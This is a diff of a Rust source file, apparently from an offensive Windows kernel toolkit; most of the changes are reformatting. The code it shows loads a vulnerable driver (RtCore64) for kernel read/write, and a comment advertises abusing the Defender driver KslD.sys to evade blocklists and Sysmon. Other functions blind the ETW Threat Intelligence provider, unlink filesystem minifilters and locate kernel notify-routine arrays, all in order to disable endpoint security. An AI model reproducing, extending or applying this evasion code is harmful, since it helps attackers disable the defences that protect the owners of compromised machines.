@@ -27,20 +27,20 @@
 
 #![cfg(target_os = "windows")]
 
-pub mod resolve;
 pub mod driver_load;
 pub mod kernel_base;
-pub mod pagewalk;
-pub mod pattern_scan;
-pub mod va_rw;
 /// KslD.sys — "Living off the Defender" KernelRw impl (default bootstrap).
 /// Uses the Microsoft-signed Defender driver for arbitrary kernel R/W without
 /// file drop or driver load. No blocklist signature, no Sysmon EID 6.
 pub mod ksld;
+pub mod pagewalk;
+pub mod pattern_scan;
+pub mod resolve;
+pub mod va_rw;
 
-use crate::{EtwTiKit, KernelRw, KitError};
+use crate::byovd::{ByovdDriver, RtCore64, VulnDriverIoctl};
 use crate::etwti::{EtwTiBlind, EtwTiOffsets};
-use crate::byovd::{ByovdDriver, VulnDriverIoctl, RtCore64};
+use crate::{EtwTiKit, KernelRw, KitError};
 use alloc::boxed::Box;
 use alloc::format;
 
@@ -162,7 +162,10 @@ pub unsafe fn blind_etw_ti_full(
     offsets: EtwTiOffsets,
 ) -> Result<(driver_load::LoadedDriver, ByovdDriver), KitError> {
     let (mut loaded, krw) = unsafe { bootstrap_byovd(sys_path, svc_name) }?;
-    let kit = EtwTiBlind { prov_reg_handle_kva, offsets };
+    let kit = EtwTiBlind {
+        prov_reg_handle_kva,
+        offsets,
+    };
     match kit.blind(&krw) {
         Ok(()) => Ok((loaded, krw)),
         Err(e) => {
@@ -209,11 +212,12 @@ pub unsafe fn unlink_minifilters(
     krw: &dyn KernelRw,
     flt_globals_kva: usize,
 ) -> Result<(), KitError> {
-    use crate::MiniFilterKit;
     use crate::telemetry::MiniFilterUnlinker;
+    use crate::MiniFilterKit;
     if flt_globals_kva == 0 {
         return Err(KitError::Other(
-            "flt_globals_kva is 0 — MiniFilter unlink not wired (resolve fltmgr FltGlobals first)".into(),
+            "flt_globals_kva is 0 — MiniFilter unlink not wired (resolve fltmgr FltGlobals first)"
+                .into(),
         ));
     }
     let unlinker = MiniFilterUnlinker { flt_globals_kva };
@@ -263,8 +267,7 @@ pub fn resolve_offsets(
     const NTOSKRNL_SCAN_SIZE: usize = 2 * 1024 * 1024;
     let scan_len = size.min(NTOSKRNL_SCAN_SIZE);
     let mut image = alloc::vec![0u8; scan_len];
-    krw.kread(base, &mut image)
-        .map_err(KitError::from)?;
+    krw.kread(base, &mut image).map_err(KitError::from)?;
 
     // Step 3: Pattern-scan all 5 known global variables.
     let map = pattern_scan::scan_all_known(&image);
@@ -276,7 +279,9 @@ pub fn resolve_offsets(
         // Try exported symbol first (resolve_kernel_symbol needs the full image).
         let mut full_image = alloc::vec![0u8; size.min(16 * 1024 * 1024)];
         let _ = krw.kread(base, &mut full_image);
-        if let Some(rva) = crate::byovd::resolve_kernel_symbol(&full_image, b"EtwThreatIntProvRegHandle") {
+        if let Some(rva) =
+            crate::byovd::resolve_kernel_symbol(&full_image, b"EtwThreatIntProvRegHandle")
+        {
             base + rva as usize
         } else if let Some(&rva) = map.get("EtwThreatIntProvRegHandle") {
             // Fallback: pattern scan found it.
@@ -310,15 +315,9 @@ pub fn resolve_offsets(
     // Expected RVA ranges (approximate, from known builds).
     // Process array is typically at a lower RVA than Thread.
     // These are broad enough to cover UBR drift (~0x8000 bytes).
-    let process_kva = resolve_with_range(
-        "PspCreateProcessNotifyRoutine", 0x400_000, 0x600_000,
-    );
-    let thread_kva = resolve_with_range(
-        "PspCreateThreadNotifyRoutine", 0x400_000, 0x600_000,
-    );
-    let image_kva = resolve_with_range(
-        "PspLoadImageNotifyRoutine", 0x400_000, 0x600_000,
-    );
+    let process_kva = resolve_with_range("PspCreateProcessNotifyRoutine", 0x400_000, 0x600_000);
+    let thread_kva = resolve_with_range("PspCreateThreadNotifyRoutine", 0x400_000, 0x600_000);
+    let image_kva = resolve_with_range("PspLoadImageNotifyRoutine", 0x400_000, 0x600_000);
     let ps_active_kva = if let Some(&rva) = map.get("PsActiveProcessHead") {
         base + rva as usize
     } else {
@@ -332,10 +331,10 @@ pub fn resolve_offsets(
         ps_active_process_head_kva: ps_active_kva,
         etw_ti_handle_kva: etw_handle_kva,
         flt_globals_kva: 0, // requires fltmgr PDB/pattern — not in ntoskrnl.
-                           // MiniFilter algorithm is in telemetry.rs::MiniFilterUnlinker;
-                           // wire it via resolve_flt_globals_kva(rva) + unlink_minifilters()
-                           // (operator resolves the FltGlobals RVA offline from the PDB).
-                           // See STATUS.md G4.
+        // MiniFilter algorithm is in telemetry.rs::MiniFilterUnlinker;
+        // wire it via resolve_flt_globals_kva(rva) + unlink_minifilters()
+        // (operator resolves the FltGlobals RVA offline from the PDB).
+        // See STATUS.md G4.
         ntoskrnl_base: base,
         ntoskrnl_size: size,
     })
